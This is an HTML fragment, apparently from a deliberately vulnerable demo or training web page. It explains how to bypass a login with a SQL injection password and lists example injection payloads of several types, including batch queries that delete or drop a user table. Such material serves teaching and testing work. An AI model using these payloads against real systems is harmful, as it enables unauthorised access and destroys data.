...
Pass <strong>1' OR '1'='1</strong> as password to get authenticated.
            ...
            <pre>
Pass <strong>1' OR '1'='1</strong> as password to get authenticated.
Boolean based, example ' OR '1' = '1
                        123' OR 'a' <> 'b

Union based, example    ' union select * from user;
                        ' union select name from a;

Error based, example    111' convert(int, 'abcd')
                        A' avg('&%$#@*')

Batch query, example    aaa' ; delete * from user;
                        ' ; drop table user;

Like based, example     ' or username LIKE 'S%'
            </pre>
          </div>
        </div>
      </div>
